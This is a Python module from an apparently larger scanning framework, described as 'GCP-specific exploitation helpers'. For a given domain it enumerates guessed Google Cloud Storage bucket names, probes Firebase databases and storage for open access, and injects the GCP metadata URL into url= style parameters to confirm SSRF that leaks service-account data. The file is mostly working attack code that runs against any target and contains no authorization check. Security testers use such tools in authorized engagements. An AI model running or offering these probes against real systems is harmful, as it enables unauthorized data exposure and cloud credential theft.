"""
modules/gcp_deep.py
-------------------
GCP-specific exploitation helpers.

Checks:
  - GCS bucket enumeration
  - Firebase Realtime DB misconfig
  - Firebase Cloud Storage rules
  - GCP metadata (via SSRF)
  - Cloud Run / Cloud Functions URLs
"""

import json
import re
from typing import List, Dict, Optional, Set
from urllib.parse import urlparse

from core.logger import get_logger, info, ok, warn
from core.utils import safe_request, write_lines
from core.rate_limiter import acquire
from modules._common import load_urls, module_dir, save_finding, cli_main

log = get_logger("gcp_deep")


# ─────────────────────────────────────────
# Brand extraction
# ─────────────────────────────────────────
def _brand_names(domain: str) -> Set[str]:
    base = domain.split(".")[0].lower()
    names = {base, base.replace("-", ""), base.replace("_", "")}
    for pre in ["", "dev-", "staging-", "prod-", "test-", "backup-",
                "media-", "static-", "assets-", "cdn-", "storage-"]:
        for suf in ["", "-dev", "-staging", "-prod", "-backup", "-media",
                    "-static", "-assets", "-cdn", "-files", "-app"]:
            names.add(f"{pre}{base}{suf}")
    return {n for n in names if n}


# ─────────────────────────────────────────
# GCS bucket check
# ─────────────────────────────────────────
def check_gcs_bucket(bucket: str) -> List[Dict]:
    findings: List[Dict] = []
    urls = [
        f"https://storage.googleapis.com/{bucket}",
        f"https://storage.googleapis.com/storage/v1/b/{bucket}/o",
        f"https://{bucket}.storage.googleapis.com",
    ]
    for url in urls:
        acquire(url)
        r = safe_request(url, timeout=8)
        if not r:
            continue
        if r.status_code == 200 and "ListBucketResult" in (r.text or ""):
            findings.append({
                "type": "gcs_bucket_public_list",
                "url": url,
                "evidence": f"GCS bucket '{bucket}' publicly listable",
                "severity": "high",
                "confidence": 95,
            })
            break
        if r.status_code == 200 and '"items"' in (r.text or "") and "storage/v1" in url:
            findings.append({
                "type": "gcs_bucket_public_api",
                "url": url,
                "evidence": f"GCS bucket '{bucket}' listable via API",
                "severity": "high",
                "confidence": 90,
            })
            break
        if r.status_code == 403 and "AccessDenied" in (r.text or ""):
            findings.append({
                "type": "gcs_bucket_exists",
                "url": url,
                "evidence": f"GCS bucket '{bucket}' exists (403)",
                "severity": "info",
                "confidence": 75,
            })
            break
    return findings


# ─────────────────────────────────────────
# Firebase checks
# ─────────────────────────────────────────
def check_firebase_realtime_db(project: str) -> Optional[Dict]:
    """
    Check Firebase Realtime Database for open access.
    """
    urls = [
        f"https://{project}-default-rtdb.firebaseio.com/.json",
        f"https://{project}.firebaseio.com/.json",
        f"https://{project}-default-rtdb.firebaseio.com/.json?shallow=true",
    ]
    for url in urls:
        acquire(url)
        r = safe_request(url, timeout=8)
        if not r:
            continue
        if r.status_code == 200:
            text = r.text or ""
            if text.strip() and text.strip() not in ("null", "{}"):
                return {
                    "type": "firebase_rtdb_open",
                    "url": url,
                    "evidence": f"Firebase RTDB accessible (len={len(text)})",
                    "severity": "critical",
                    "confidence": 90,
                }
            if text.strip() == "null":
                return {
                    "type": "firebase_rtdb_exists",
                    "url": url,
                    "evidence": "Firebase RTDB exists (null root)",
                    "severity": "info",
                    "confidence": 70,
                }
    return None


def check_firebase_storage(project: str) -> Optional[Dict]:
    """
    Check Firebase Storage for open access.
    """
    urls = [
        f"https://firebasestorage.googleapis.com/v0/b/{project}.appspot.com/o",
    ]
    for url in urls:
        acquire(url)
        r = safe_request(url, timeout=8)
        if not r:
            continue
        if r.status_code == 200 and '"items"' in (r.text or ""):
            return {
                "type": "firebase_storage_open",
                "url": url,
                "evidence": "Firebase Storage publicly listable",
                "severity": "high",
                "confidence": 85,
            }
        if r.status_code == 403:
            return {
                "type": "firebase_storage_exists",
                "url": url,
                "evidence": "Firebase Storage exists (403)",
                "severity": "info",
                "confidence": 60,
            }
    return None


# ─────────────────────────────────────────
# GCP metadata via SSRF
# ─────────────────────────────────────────
def check_gcp_metadata_via_ssrf(url: str) -> Optional[Dict]:
    if "=" not in url:
        return None
    metadata_url = "http://metadata.google.internal/computeMetadata/v1/"
    parsed = urlparse(url)
    if not any(p in parsed.query.lower() for p in
               ["url=", "uri=", "target=", "dest="]):
        return None
    test_url = re.sub(r"=(https?://[^&]+)", f"={metadata_url}", url, count=1)
    acquire(test_url)
    # GCP metadata needs Metadata-Flavor header
    r = safe_request(test_url, headers={"Metadata-Flavor": "Google"}, timeout=10)
    if r and ("computeMetadata" in (r.text or "") or
              "project-id" in (r.text or "") or
              "service-accounts" in (r.text or "")):
        return {
            "type": "gcp_metadata_ssrf_confirmed",
            "url": test_url,
            "evidence": "GCP metadata service leaked",
            "severity": "critical",
            "confidence": 90,
        }
    return None


# ─────────────────────────────────────────
# Orchestrator
# ─────────────────────────────────────────
def run(domain: str, output_root: str = "results",
        scan_id: Optional[int] = None) -> Dict:
    mdir = module_dir(domain, "gcp_deep", output_root)
    urls = load_urls(domain, output_root)

    findings: List[Dict] = []
    brands = _brand_names(domain)

    # GCS buckets
    info(f"Testing {len(brands)} GCS bucket candidates")
    for b in list(brands)[:40]:
        for f in check_gcs_bucket(b):
            findings.append(f)

    # Firebase
    info("Testing Firebase projects")
    for b in list(brands)[:20]:
        f = check_firebase_realtime_db(b)
        if f:
            findings.append(f)
        s = check_firebase_storage(b)
        if s:
            findings.append(s)

    # GCP metadata via SSRF
    for url in urls[:20]:
        try:
            f = check_gcp_metadata_via_ssrf(url)
            if f:
                findings.append(f)
        except Exception as e:
            log.debug(f"gcp metadata test failed: {e}")

    # Save
    for f in findings:
        save_finding(domain, "gcp_deep", f["type"], f["severity"],
                     f["url"], evidence=f.get("evidence", ""),
                     confidence=f.get("confidence", 0),
                     scan_id=scan_id, output_root=output_root)

    if findings:
        write_lines(mdir / "gcp_findings.txt",
                    [f"[{f['severity']}] {f['type']} → {f['url']}"
                     for f in findings])

    return {"count": len(findings), "findings": findings}


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser(description="GCP deep scanner")
    p.add_argument("-t", "--target", required=True)
    p.add_argument("-o", "--output", default="results")
    args = p.parse_args()
    cli_main(args.target, "gcp_deep", run, args.output)